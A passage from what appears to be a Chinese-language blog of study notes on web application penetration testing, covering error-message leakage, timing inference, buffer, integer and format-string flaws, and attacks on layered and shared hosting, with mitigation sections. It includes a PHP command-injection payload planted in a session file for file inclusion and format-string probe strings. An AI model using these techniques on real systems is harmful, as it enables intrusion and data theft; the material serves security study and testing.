<li>保存在会话令牌中的令牌；</li>
<li>数据传输的加密密钥；</li>
<li>CPU 寄存器的值、栈内容、加载的 DLL 列表和路径等；</li>
</ul>
<h3 id="服务器与数据库消息"><a href="#服务器与数据库消息" class="headerlink" title="服务器与数据库消息"></a>服务器与数据库消息</h3><p>除了应用程序本身，其他组件如数据库、邮件服务器、SOAP 服务器等，在遇到无法处理的错误时，也会抛出详细的错误信息；有时候这些信息会被应用程序放在响应主体中返回到前端，此时攻击者可以利用这些信息，探查到更多的漏洞，常见的利用形式包括：</p>
<ul>
<li>扩大攻击范围：例如数据库抛出查询错误，从而暴露了 SQL 查找代码的逻辑，攻击者可加以利用，优化 SQL 注入行为；</li>
<li>实施跨站点脚本攻击：有些框架返回错误消息的响应时，没有对错误消息进行 HTML 编码，因此如果错误消息中的某个部分是可以由用户控制的输入，那么此时攻击者就有机会针对性的设计输入，干扰浏览器的解析，实现跨站点脚本注入攻击；</li>
<li>获取解密提示：应用程序可能使用某个解密值对某个加密文件进行解密，但该文档不存在时，该解密值有可能会意外显示在错误消息中；</li>
<li>获取重要的文件路径：错误消息可能会暴露应用程序加载某个服务器文件路径中的文件，此时攻击者可以找机会上传文件，覆盖该路径中的文件；</li>
</ul>
<p>渗透测试步骤</p>
<ul>
<li>当通过设计攻击字符串发送大量攻击请求时，应始终监控应用程序的响应，在确定是否包含有用的错误信息；发挥想象力，强制应用程序返回错误响应，例如对未处于就绪状态的资源，发起请求；</li>
<li>应用程序返回的响应内容不一定会显示在浏览器中，应留意所有可能出现错误信息的关键字，例如：error, exception, illegal, invalid, fail, stack, access, directory, file, not found, varchar, ODBC, SQL, SELECT 等；</li>
<li>另外需要留意一下出现在响应中的关键字，是否原本就已经在发送的请求参数中了，如果是的话，则不一定是错误响应，应当排除；</li>
<li>可以使用 Grep 函数来搜索匹配的关键字；如果发现，应当手动检查相应的响应，分析其中是否包含有用的信息；</li>
</ul>
<blockquote>
<p>有些浏览器会隐藏原始的错误消息，然后用一个浏览器自己的定制页面来替代，因此需要提前关闭浏览器的该项功能；</p>
</blockquote>
<h3 id="借助搜索引擎"><a href="#借助搜索引擎" class="headerlink" title="借助搜索引擎"></a>借助搜索引擎</h3><p>不同的 Web 应用程序使用的库不尽相同，经常五花八门，当出现一些未曾见过的错误信息时，只需到网上进行搜索，即可以进一步了解到该错误发生的原因和逻辑；</p>
<blockquote>
<p>开发者有时并不一定直接引用某个库，而只是复制部分代码，合并到其源代码中；</p>
</blockquote>
<p>渗透测试步骤</p>
<ul>
<li>使用标准搜索引擎搜索任何不常见的错误消息文本，以及学会使用各种高级搜索特性，缩小搜索的范围，例如："unable to retrieve" filetype:php</li>
<li>同一条错误消息，其他应用程序生成的内容可能更加详细，有助于更好的了解错误发生的条件；</li>
<li>使用 Google 代码搜索功能，查找生成特定错误消息的开源代码；学会使用高级搜索特性指定代码语言和一些已知的细节，从而缩小搜索范围，提高搜索效率，例如 "unable to retrieve lang:php package:mail"</li>
<li>如果从栈追踪中得知了所使用的第三方库或组件的名称，则可以直接搜索这些名称；</li>
</ul>
<h3 id="制造详尽的错误消息"><a href="#制造详尽的错误消息" class="headerlink" title="制造详尽的错误消息"></a>制造详尽的错误消息</h3><p>攻击者通过系统性的制造错误条件，触发错误消息，很可能可以从错误消息中收获很多有价值的敏感信息。例如让应用程序对某个数据执行某种无效的操作（如字符串转整数），就会自动触发错误条件，导致应用程序报错；如果报错的信息中，会暴露该无效操作要处理的数据，则攻击者就得到了该数据，而且正常情况下，攻击者是不知道该数据的值的；</p>
<blockquote>
<p>例如可以在 SQL 注入攻击中，在 SQL 语句中检索某个数据并对其进行错误的类型转换，从而触发 ODBC 的报错，然后从报错消息中得到检索的数据</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210410092712.png"></p>
</blockquote>
<p>如果应用程序在报错时，会生成包含错误描述的栈追踪，则可以利用该特性，将想要获取的有用信息，合并到错误描述中；</p>
<p>有些数据库允许开发者创建自定义函数，假设应用程序存在 SQL 注入漏洞，那么攻击者就可以利用该漏洞，注入任意的自定义函数，执行任意的动作。假设应用程序还会返回错误信息给浏览器，那么攻击者就可以故意让函数生成异常，并将获取的信息，放在错误消息中，让应用程序返回。</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210410093438.png"></p>
<h2 id="收集公布的信息"><a href="#收集公布的信息" class="headerlink" title="收集公布的信息"></a>收集公布的信息</h2><p>由于功能设计需要，应用程序会在界面上有意无意的显示出来一些对攻击者有用的敏感信息，例如：</p>
<ul>
<li>有效用户名、ID、文档列表等；</li>
<li>用户个人资料、用户角色、权限、最后登录日期、账户状态等；</li>
<li>用户当前使用的密码（一般不会直接显示在页面上，但却出现在响应的源代码中）；</li>
<li>部分日志文件中的信息，如用户名、URL、执行的动作、会话令牌、数据库查询等；</li>
<li>HTML 源代码中的注释内容，如链接、表单字段等；</li>
</ul>
<p>渗透测试步骤：</p>
<ul>
<li>核对应用程序的解析结果，看哪些服务端功能，或者哪部分客户端数据，可用于获取有用的信息；</li>
<li>找出服务端会返回敏感信息的所有位置（注意：这些敏感信息可能只出现在响应内容中，但没有在界面上显示）；</li>
<li>检查应用程序是否存在访问控制或会话控制的漏洞，如果有，则可以用来获取其他用户的敏感数据；</li>
</ul>
<h2 id="使用推论"><a href="#使用推论" class="headerlink" title="使用推论"></a>使用推论</h2><p>有时候，应用程序可能并不会泄露数据，但由于其功能设计缺陷，导致攻击者可以通过逆向推理，获知有用的信息，例如：</p>
<ul>
<li>如果用户名已经存在，注册功能会给出提示，因此攻击者可以利用这个提示对用户进行枚举；</li>
<li>搜索引擎将所有内容编入索引，在搜索功能中未做权限检查或过滤；</li>
<li>利用 SQL 注入漏洞，一个查询一个字符，虽然查询的内容并不会返回，但是可以将查询结果放入表达式进行计算，若条件成立，则设置其会触发错误，通过是否得到错误响应，来反向推断查询结果是否符合表达式的计算预期；</li>
</ul>
<p>另外，攻击者还可以通过响应的时间延迟，来推断某些数据是否有效；</p>
<ul>
<li>许多大型系统由于其数据库的条目较为庞大，单次查询需要花费较多的时间，为了提高性能，一般会使用缓存机制，即将频繁使用放在缓存中；因此，通过访问时间的差别，攻击者可以推断哪些数据最近有被访问；</li>
<li>有些请求需要验证用户的身份信息，因为应用程序需要查询数据库，进行权限的逻辑判断，攻击者可以利用处理时间的差异，枚举出有效的用户名；</li>
<li>当用户在请求中提交一个无效的参数时，有可能造成应用程序的处理超时；根据是否超时，攻击者可以枚举有效的参数值，了解参数值的范围，例如该参数值是服务端内部网络的地址，那么攻击者就可以枚举出有效的主机地址（Burp 工具内置一个响应计时器，可以用来判断这种情况是否出现）；</li>
</ul>
<p>渗透测试步骤：</p>
<ul>
<li>总体来说，应用程序在处理大多数请求时，其响应时间的差异非常小，如果有，也很难排除是否是由于随机的网络状况引起的，需要定量统计才能排除；只有少数功能涉及 IO 或 CPU 的密集计算，才会导致存在差异；</li>
<li>为测试某个功能在处理有效和无效数据时，是否存在时间差异，可以准备两个待发送的数据列表，一个全是有效的数据，一个全是无效的，然后不断发送请求，一次只发一个，最后比对二者在响应时间上是否存在统计差异（Burp 有内置自动统计的工具）；</li>
</ul>
<h2 id="防止信息泄露-1"><a href="#防止信息泄露-1" class="headerlink" title="防止信息泄露"></a>防止信息泄露</h2><h3 id="使用常规错误消息"><a href="#使用常规错误消息" class="headerlink" title="使用常规错误消息"></a>使用常规错误消息</h3><p>应避免向浏览器返回任何服务端的错误消息或调试消息，而是只返回一种统一的消息格式，同时将服务端的错误或调试消息单独记录在日志文件中；如果需要用户汇报错误情况，则可以给浏览器返回一个日志索引号，当用户反馈错误时，只需要提交该索引号即可；</p>
<p>多数 Web 应用程序框架或者服务器软件都支持拦截错误消息的配置，配置后，错误消息将不会返回给浏览器，而是返回一个统一定制的错误页面；</p>
<h3 id="保护敏感信息"><a href="#保护敏感信息" class="headerlink" title="保护敏感信息"></a>保护敏感信息</h3><p>应用程序应禁止向浏览器发送任何有关用户的敏感信息，如用户名、用户个人资料、日志记录等；如果用户需要查看这些信息，则应对查看功能加上权限检查，同时，只返回信息的截短后的形式，而不是完全披露现有的数据；</p>
<h3 id="尽量减少客户端信息泄露"><a href="#尽量减少客户端信息泄露" class="headerlink" title="尽量减少客户端信息泄露"></a>尽量减少客户端信息泄露</h3><p>只要有可能，应该删除或者修改任何有关服务器软件、软件框架名称和版本等相关信息的标记，避免泄露特定的版本信息；同时，应该删除生产环境中的代码的所有注释；</p>
<p>此外，如果在前端使用一些第三方组件，如 Java Applet 或者 ActiveX 控件，则也应该避免在其中存放任何的敏感信息，因为攻击者可以逆向它们；</p>
<h1 id="16-攻击本地编译型应用程序"><a href="#16-攻击本地编译型应用程序" class="headerlink" title="16. 攻击本地编译型应用程序"></a>16. 攻击本地编译型应用程序</h1><p>现在多数 Web 应用程序都不再是本地编译型程序了，它们大多数都运行在某个解释环境中，例如 Java，C#，Python，NodeJS 等；尽管如此，它们仍然有可能调用某些编译型语言写的库，因此，除非有充分的信息说明该应用程序未调用任何本地编译的代码，否则应该对其进行漏洞探查；</p>
<p>本地编译型程序的代码是由 CPU 直接运行的，没有解释环境，因此，它们一般受到缓冲区溢出、格式化字符串、整数漏洞等问题的困扰，当对这些漏洞进行探查时，很容易造成整个应用程序的崩溃（如果是对现有处于生产状态的应用程序进行这方面漏洞的探查工作，则需要知悉这个风险，通常情况下，最好是对测试环境中的程序进行探查比较好）；</p>
<blockquote>
<p>本地编译型软件的漏洞是另外一个巨大的课题，如需要进一步研究，作者推荐以下几本参考书：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210412084632.png"></p>
</blockquote>
<h2 id="缓冲区溢出漏洞"><a href="#缓冲区溢出漏洞" class="headerlink" title="缓冲区溢出漏洞"></a>缓冲区溢出漏洞</h2><p>由于虚拟内存机制，应用程序的指令实际上能够控制的是虚拟内存，物理内存理论上应该不存在缓冲区溢出的问题。溢出问题主要出现在写入的数据，超过了所分配的空间，因此，多出来的部分，覆盖了其他旧数据。当应用程序尝试读取旧数据时，实际上已经被替换为溢出的新数据，此时如果应用程序没有察觉，就有可能信任这些数据并直接使用或者执行。</p>
<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>开发者常常犯的一个错误是将某个大小可变的数据，写入某个大小固定的内存中；在开发的时候，开发者会默认正常的输入有最大长度，但如果没有校验和过滤，实际上输入的长度将是任意的；</p>
<p>默认情况下，如果没有特别声明，函数内部的局部变量使用栈来存储临时的数据，因此，攻击者可以通过控制实参的长度，让其超过开发者在函数中分配的变量长度，造成栈溢出；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210413072251.png"></p>
<p>栈空间是由编译管理和分配的，因此其中保存着函数调用后的返回地址；当发生栈溢出后，原本的返回地址将被改写；但CPU 并不知晓，但其尝试读取返回地址时，实际上很可能会取到攻击写入的其他返回地址，跳转到攻击者注入的代码，执行攻击者预设的指令；</p>
<h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><p>堆溢出和栈溢出并没有本质上的区别，唯一的差别是发生的地点在堆上；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210413072426.png"></p>
<p>堆是由开发者进行管理和分配的，因此里面通常保存着纯数据类型的内容，不像栈中放着返回地址；当发生堆溢出时，会覆盖其他块的头部数据，导致其他块不可用。由于堆通常使用双向链接结构来实现，因此一旦某个块被破坏了，后续的块可能全部不可用了；</p>
<p>因此，如果要利用堆溢出的漏洞，攻击者就必须特别小心，需要精心设计其溢出数据，让其在不破坏原本下一个块的头部数据的基础上，改写其中的指向下一个链表指针。该值被修改后，并不会马上发生什么后果；但是当这个块被回收时，由于堆控制器需要更新链表，因此它需要从块的头部数据中，读取下一个块的址，但实际上，该地址的值已经被攻击者通过溢出修改了。攻击者可以让这个地址的值，指向任意位置，执行其注入的指令；一般攻击者会让改写后的指针值，指向下一个被调用的函数地址，这样该函数就会在接下来执行；或者指向异常处理函数的地址，这样当下次发生异常时，函数会被执行；</p>
<blockquote>
<p> 由于开发者的编程错误不可避免，因此目前很多编译器和操作系统已经设计出了各种机制，来尽量缓冲区溢出的问题；整体来说，缓冲区溢出漏洞的利用比以往要难得多；</p>
</blockquote>
<h3 id="一位偏移漏洞"><a href="#一位偏移漏洞" class="headerlink" title="一位偏移漏洞"></a>一位偏移漏洞</h3><p> 理论上，为了避免出现缓冲区溢出，开发者在复制参数内容，写入分配的缓冲区时，应该控制写入的长度，示例如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210413075720.png"></p>
<p>在代码中，开发者已经将长度控制在 32 位了，但是，由于字符串最后还需要一个终止符，所以实际字符串的最大长度只能是 31 位；此时，如果攻击者传入 32 位的字符串参数，将导致终止符溢出，覆盖邻近内存上的数据；</p>
<p>通常字符串的终止符只有一个字节的长度，而邻近的内存，正常是另外一个栈桢的头部，该头部通常包含着返回地址；当溢出发生时，原本的返回地址将有一个低位字节被改写为零（地址通常不止一个字符，例如 32 位的字符有4个字节）；被改写后的返回地址的值变小了，因此很可能会重新指向原本的 _username 缓冲区中，从而指向攻击者控制的数据；如果攻击者精心设计其输入的数据，那么便有可能接管接下来要执行的指令；</p>
<p>另外还有一种漏洞，是开发者忘了给缓冲区中的字符串添加终止符， 这样会导致编译器无法在预期的位置结束字符串，而是会一直往下读取，直到遇到值为零的字符为止；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210413080927.png"></p>
<p>这种漏洞会造成应用程序一些奇怪的异常行为，它使用变量值变长了，如果该变量值有可能被返回到浏览器的话，那么攻击者就可以利用这个漏洞来获取内存中的其他数据，造成信息泄露的风险；</p>
<h3 id="查找缓冲区溢出漏洞"><a href="#查找缓冲区溢出漏洞" class="headerlink" title="查找缓冲区溢出漏洞"></a>查找缓冲区溢出漏洞</h3><p>大多数情况下，向应用程序发送一个超过其预期长度的字符串，即可以探查出是否存在缓冲区溢出漏洞（少数漏洞需要发送特定的长度，或者特定范围内的长度）；</p>
<p>渗透测试步骤：</p>
<ul>
<li>由于开发者通常喜欢使用 2 的整数倍做为字符串缓冲区长度，例如 32，128，512，4096 等；因此可向每个目标数据，提交一稍大于缓冲区大小的长字符串，例如 1100， 4200， 33000 等；</li>
<li>一次只攻击一个目标数据；</li>
<li>轮流发起攻击，尽量覆盖所有的目标数据；</li>
<li>可以使用第三方工具如 Burp 设置好规则，然后自动生成各种大小的有效攻击数据；</li>
<li>监控应用程序的反应，看看有没有发生什么异常现象；常见的异常包括：<ul>
<li>HTTP 500 状态码或者出现错误消息（跟不符合格式的输入造成的异常不同）；</li>
<li>比常规内容更详细的错误消息（很可能意味着某个组件发生了错误）；</li>
<li>TCP 没有响应或者突然关闭；</li>
<li>整个 Web 应用程序停止响应；</li>
</ul>
</li>
<li>当发生堆溢出时，一般并不会马上导致程序崩溃，但是很有可能会在后续某个时间点造成崩溃；因此，要确定哪些字符串造成崩溃，还需要一定的观察时间；</li>
<li>一位偏移漏洞一般不会造成崩溃，但一般会导致出现异常行为，此时应用程序可能会返回异常的数据内容；</li>
</ul>
<p>通常情况下，应用程序会对输入的参数长度进行检查，并告知长度不符合要求，此时可以在其允许的范围内，尽可能的大；另外应用程序的检查机制可能还会限制参数的字符范围，因此，在探查漏洞前，攻击者应该先了解清楚参数规则，然后确保每个参数都符合规则的情况下，长度尽量长（通常可以使用一个已经验证有效的请求中的参数的字符串，然后加大其长度即可）；</p>
<blockquote>
<p>有时候尽管发现了缓冲区溢出漏洞，但是要对其加以利用，仍然要面临很多挑战待解决</p>
</blockquote>
<h2 id="整数漏洞"><a href="#整数漏洞" class="headerlink" title="整数漏洞"></a>整数漏洞</h2><p>计算器以有限的位数，来模拟无限的计算，因此在某些特定的情况下，这种计算存在溢出的风险；</p>
<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>当某个整数的计算结果超过了处理器可处理的最大值或者最小值时，就会发生溢出，这时计算结果会从最大值进入一个极小值，或者反过来，从最小值进入一个极大值；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414070557.png"></p>
<p>上面这段代码计算了参数的长度，并增加 1 个字节，用来存储结束符；但由于长度的类型是 short，每种类型的整数，都有一个能够表示的最大值，对于 short 来说是 65535，因此，当长度计算结果超过了 65535 时，计算并存储结果时，就会发生溢出；攻击者可以利用这个漏洞，让参数长度为 65535，添加 1 后，溢出为 0；malloc 分配了一个长度为 0 的缓冲区，当向缓冲区写入数据时，很可能会覆盖邻近的缓冲区；</p>
<h3 id="符号错误"><a href="#符号错误" class="headerlink" title="符号错误"></a>符号错误</h3><p>在 C 和 C++ 中，有一个讨厌的地方，即整数存在有符号和无符号两种类型，有符号指有正负符号，它需要占用一个位来存储符号；无符号则可以节省一个位，因此可表示的正整数范围更大一些。但是这也引入了一些安全隐患，即开发者在编写代码时，有时候不小心会将两种不同符号类型的变量放在一起计算，这些导致隐式的符号转换，编译器的处理方式是统一转换成无符号类型，这种转换并没有实际性的改变内存中的数据，而只是在逻辑层面，对内存中的数据换类型进行解读，因此原本有符号值，如果按无符号进行解读，有可能从负数变成一个很大的正数；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414071617.png"></p>
<p>攻击者可以利用这个特点，传入一个负数，之后被 strncpy 隐式转换为很大的正数，导致处理器向原本很小的缓冲区尝试写入一个很大长度的字符串，从而发生溢出；</p>
<h3 id="查找整数漏洞"><a href="#查找整数漏洞" class="headerlink" title="查找整数漏洞"></a>查找整数漏洞</h3><p>如果客户端提交的请求中包含整数值，就意味着有可能存在整数溢出的漏洞，常见情况如下：</p>
<ul>
<li>客户端在请求参数、cookie、消息主体中，提交以十进制表示的整数值，此时应特别留意那些表示某个字符串长度的整数值；</li>
<li>有时候表示长度的整数值来源于某个二进制对象，因此并不以十进制表示，而是以十六进制表示，或者使用 Base64 编码，以便于进行 HTTP 传输；</li>
</ul>
<p>渗透测试步骤：</p>
<ul>
<li>当发现存在整数参数值，就可以尝试轮流发送不同的值，这些值分别是有符号和有符号类型的边界值；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414072441.png"></li>
<li>如果参数以十六进制表示，则将上一步的边界值转换为相应的大端法或小端法的版本，如果十六进制值以 ASCII 格式提交，则应转换成相应的编码字符，确保可以被服务端正确解析</li>
<li>监控提交请求后，应用程序是否出现异常行为</li>
</ul>
<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p> 某些函数接受格式说明符（例如 C 语言中的 printf），有时候这些函数存在被滥用的漏洞。通常这类型的函数接受的变量数量是不定的，并且支持多种类型的参数；其中一个非常危险的格式说明符是 %n，它跟普通的格式说明符的意思很不一样，它表示接受一个指针作为参数，之后会将该说明符之前函数输出的字节数量写入到指针指向的位置；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414074756.png"></p>
<p>这意味着如果攻击者能够控制全部或部分传入的参数，那么就可以修改指针值，让函数调用成功后，将结果写入到其指定的位置，覆盖原来的值，从而导致后续处理器读取的内容发生变化，并跳转到攻击者指定的位置，执行任意的代码；</p>
<h3 id="查找格式化字符串漏洞"><a href="#查找格式化字符串漏洞" class="headerlink" title="查找格式化字符串漏洞"></a>查找格式化字符串漏洞</h3><p>探查格式化字符串漏洞的一个基本办法是在提交的请求参数中，包含大量的格式符，看应用程序如何处理它们；通常来说，如果应用程度存在这方面的漏洞，很有可能导致应用程序崩溃；</p>
<p>渗透测试步骤：</p>
<ul>
<li>轮流向每个目标参数提交包含大量格式化符 %n 和 %s 的字符串；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414075345.png"></li>
<li>Windows FormatMessage 函数处理 prinft 函数中的说明符的方式略有不同，因此提交的参数应改写如下：<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414075539.png"></li>
<li>另外需要将 % 符号使用 URL 编码编成 %25，以便服务端能够正确解析</li>
<li>监控应用程序是否出现异常反应；</li>
</ul>
<h2 id="小结-10"><a href="#小结-10" class="headerlink" title="小结"></a>小结</h2><p>整体来说，即使应用程序存在上述的各种漏洞，因此程序是部署在服务端，攻击者无法像安装在本地端一样对其进行反复的测试探查，因此利用上述漏洞的难度较大。一般攻击比较有可能利用一位偏移的漏洞；</p>
<h1 id="17-攻击应用程序架构"><a href="#17-攻击应用程序架构" class="headerlink" title="17. 攻击应用程序架构"></a>17. 攻击应用程序架构</h1><p>为了提高应用程序的可移植性和健壮性，通常都会对应用程序的各项功能进行模块化，并在模块之间约定好交互方式，这样可以极大的降低代码的耦合性；</p>
<h2 id="分层架构"><a href="#分层架构" class="headerlink" title="分层架构"></a>分层架构</h2><p>最常见的三层架构分别如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414080644.png"></p>
<p>以下是 Java 应用的典型分层</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414080823.png"></p>
<h3 id="攻击分层架构"><a href="#攻击分层架构" class="headerlink" title="攻击分层架构"></a>攻击分层架构</h3><h4 id="利用层之间的信任关系"><a href="#利用层之间的信任关系" class="headerlink" title="利用层之间的信任关系"></a>利用层之间的信任关系</h4><p>假设应用程序中有一层专门负责访问权限检查，另外一层负责数据库查询，通常来说，数据库查询层会默认假设从权限检查层发过来的请求都是已经通过审查的，是有效的，因此会直接执行该层发过来的请求。但是这种假设存在漏洞，即如果攻击者攻陷了权限检查层（例如利用 SQL 注入漏洞），并发出任意请求给数据库查询层，则可以查询任意的数据，而不管是否使用管理员的身份进行查询；</p>
<p>分层架构存在另外一个问题，即层与层之间的信息可能存在隔离，利用数据库查询日志显示攻击者注入的每一条查询；但是日志中可能并没有存储是哪一名用户发起的攻击，需要与业务日志进行交互比对和排查，才有可能定位；</p>
<h4 id="破坏其他层"><a href="#破坏其他层" class="headerlink" title="破坏其他层"></a>破坏其他层</h4><p>如果几个层都在相同的计算机上运行，则攻陷某一层后，攻击者就可以直接破坏其他层实施的安全保护，示例如下：</p>
<h5 id="访问解密算法"><a href="#访问解密算法" class="headerlink" title="访问解密算法"></a>访问解密算法</h5><p>通常情况下，用户的密码不应该在服务端明文保存，而是会进行散列处理，单向加密，确保即使数据库泄露，攻击者也无法提取到密码；但是有些敏感数据只能使用对称加密，因为后续还需要使用它们的明文，例如信用卡号、安全问题等；此时，如果数据库中除了存储加密后的数据，还直接存储密钥的话，那么攻击者一旦攻陷数据层（例如利用 SQL 注入漏洞），则可以直接查询到密钥，从而实现对数据的解密；</p>
<h5 id="利用文件读取提取-MySQL-数据"><a href="#利用文件读取提取-MySQL-数据" class="headerlink" title="利用文件读取提取 MySQL 数据"></a>利用文件读取提取 MySQL 数据</h5><p>假设应用程序存在路径遍历漏洞，那么攻击者可以利用这个漏洞，读取服务器上的数据库文件，绕开数据库和应用程序设置的权限控制机制；</p>
<h5 id="使用本地文件包含命令"><a href="#使用本地文件包含命令" class="headerlink" title="使用本地文件包含命令"></a>使用本地文件包含命令</h5><p>多数应用程序都会读取和访问一些本地文件，如果存在漏洞，意味着攻击者可以漏洞读取服务器上的任意文件内容，造成敏感信息泄露；如果应用程序存在文件写入漏洞的话，则攻击者可以利用该漏洞，向任意文件中写入其指定的内容（例如通过 URL 下载包含恶意命令的远程脚本，注入日志文件），并设置或等待条件触发其执行（例如包含并读取日志文件，触发提前注入的恶意命令的执行）；</p>
<p>示例：PHP 会将会话内容存在在某个以会话 id 命名的文件中</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414085214.png"></p>
<p>内容如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414085239.png"></p>
<p>因此攻击者可以通过设置自己的昵称，实现在会话文件中注入恶意命令的目的；例如将昵称设置为:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(id);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后再利用应用程序已存在的文件包含漏洞，通过将参数设置为会话文件的路径，实现对该文件的调用</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414085459.png"></p>
<p> 渗透测试步骤：</p>
<ul>
<li>对于已知的应用程序漏洞，充分发挥想象力，思考如果利用漏洞和应用程序分层架构间的信任关系，扩大漏洞的影响范围；很多针对 Web 应用程序的成功攻击，都是从利用某个影响有限的漏洞出发，再利用信任关系，破坏应用程序的其余部分，最终实现严重的攻击；</li>
<li>如果能够在应用程序的某个组件中执行任意命令，并能够与其他主机建立网络连接，则应考虑向操作系统和网络层面中的基础架构发动直接攻击，扩大攻击范围；</li>
</ul>
<h3 id="保障分层架构的安全"><a href="#保障分层架构的安全" class="headerlink" title="保障分层架构的安全"></a>保障分层架构的安全</h3><h4 id="尽量减少信任关系"><a href="#尽量减少信任关系" class="headerlink" title="尽量减少信任关系"></a>尽量减少信任关系</h4><p>每一层尽量实施自己的权限控制，防止未授权的操作，同时不信任其他组件；示例如下：</p>
<ul>
<li>服务器层对特殊的资源和 URL 路径实施基于角色的访问控制；</li>
<li>数据库层为不同的用户提供不同的账户，根据角色设置不同的权限范围；这样可以减少 SQL 注入漏洞的影响范围；</li>
<li>应用程序组件只使用最低权限的操作系统账户执行，以降低命令注入和文件遍历漏洞的影响范围；</li>
</ul>
<h4 id="隔离不同组件"><a href="#隔离不同组件" class="headerlink" title="隔离不同组件"></a>隔离不同组件</h4><p>如有可能，尽量将每个层隔离开来，避免其无意间彼此交互</p>
<ul>
<li>一个层不得读取和写入其他层使用的文件；而是使用其他层提供的访问渠道进行数据访问；</li>
<li>对不同组件之间的网络访问进行过滤，仅允许需要实现功能的最少服务。例如数据库服务器仅开放数据库查询端口，其他端口不开放；避免攻击者利用内部网络对数据库的操作系统层进行攻击；</li>
</ul>
<blockquote>
<p>有了 Docker 容器技术后，貌似以上目标更好实现了一些；</p>
</blockquote>
<h4 id="局部深层防御"><a href="#局部深层防御" class="headerlink" title="局部深层防御"></a>局部深层防御</h4><p>对构成整个应用程序的各个单独组件内部，进行加强防御；</p>
<ul>
<li>对每台主机的各个层面进行安全强化，打上漏洞补丁，以减少攻击者利用漏洞进行扩散的可能性，让攻击的影响范围仅局限于单台机器；</li>
<li>对保存在应用程序层的数据进行加密，例如用户使用的密码、用户的敏感信息（如信用卡号等）；</li>
</ul>
<h2 id="共享主机与云服务供应商"><a href="#共享主机与云服务供应商" class="headerlink" title="共享主机与云服务供应商"></a>共享主机与云服务供应商</h2><p>很多中小型企业会将自己的应用程序托管在云服务供应商的共享主机上面，此时需要注意以下风险：</p>
<ul>
<li>云服务商的某个用户可能是攻击者，通过攻击云主机，实现对共享主机中其他组织的应用程序的攻击；</li>
<li>云服务商的某个用户可能在共享主机上部署了某个易受攻击的应用程序，导致共享主机被攻陷；</li>
</ul>
<h3 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h3><p>多个 Web 应用程序可能部署在同一台虚拟主机上，然后通过域名进行区分，当请求到达虚拟主机后，Nginx 或 Apache 服务器程序根据请求中的 Host 消息头区分请求的是哪一个应用程序，然后根据预先的配置，将请求转发给虚拟主机相应的应用程序；</p>
<h3 id="共享的应用程序服务"><a href="#共享的应用程序服务" class="headerlink" title="共享的应用程序服务"></a>共享的应用程序服务</h3><p>某个应用程序背后，可能是由分层的多个供应商的不同组成集成而来的；例如某个被大量中小企业共同需求的功能；举个栗子，在信用卡支付行业，市面上可能会存在三个层级的软件供应商：</p>
<ul>
<li>零售商：向中小企业销售软件，并根据企业的需求定制外层的功能和界面；</li>
<li>信用卡公司：根据零售商的需求，开发核心功能；</li>
<li>ASP 公司：根据多家信用卡公司的共同需求，开发核心应用程序，提供主机和部署，进行更新和支持；</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210415080752.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210415081853.png"></p>
<h3 id="攻击共享环境"><a href="#攻击共享环境" class="headerlink" title="攻击共享环境"></a>攻击共享环境</h3><h4 id="针对访问机制的攻击"><a href="#针对访问机制的攻击" class="headerlink" title="针对访问机制的攻击"></a>针对访问机制的攻击</h4><p>为了支持客户的个性化需求，ASP 一般通过上传（例如 FTP 或 SCP）或修改配置文件的功能来满足客户的定制需求，通常还会开放数据库端口，供客户查询保存的数据；</p>
<p>由于 ASP 供应商不可避免需要提供某种远程访问机制，因此存在一定的风险：</p>
<ul>
<li>有些远程访问机制如 FTP 未加密，使得攻击者有机会在中间进行拦截，获取用户的密码；</li>
<li>部分远程访问软件本身存在漏洞或者配置缺陷，攻击者利用漏洞可绕过访问控制机制，访问或破坏客户的应用程序和数据；</li>
<li>远程访问的隔离机制可能做得不好，例如客户之间的数据没有完全隔离，存在相互访问的可能性；或者原本只需要提供文件访问的场景，却提供了 shell，允许客户输入各种命令；</li>
<li>数据库的隔离可能不完善；</li>
<li>数据库的连接可能使用非加密的方式访问；</li>
<li>有时 ASP 为客户提供单独的访问程序，来实现对核心程序的访问；这些单独的访问程序本身可能也存在漏洞，攻击者一旦攻陷，就可以对所有客户的应用程序发起攻击；</li>
</ul>
<h4 id="应用程序间的攻击"><a href="#应用程序间的攻击" class="headerlink" title="应用程序间的攻击"></a>应用程序间的攻击</h4><p>在共享主机环境中，通常会允许用户向服务器合法上传可执行的脚本，导致存在应用程序间攻击的漏洞</p>
